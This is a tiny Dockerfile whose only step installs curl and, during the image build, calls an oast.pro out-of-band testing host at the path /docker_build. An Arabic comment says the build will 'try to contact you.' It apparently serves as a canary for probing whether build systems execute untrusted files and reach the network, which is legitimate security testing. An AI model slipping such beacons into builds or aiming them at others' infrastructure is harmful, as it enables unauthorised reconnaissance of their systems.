FROM alpine:latest 
# أول ما يبدأ يبني، هيحاول يكلمك 
RUN apk add --no-cache curl && curl http://d52eqko3t4glbd7pm78g1oah6nforiqdc.oast.pro/docker_build
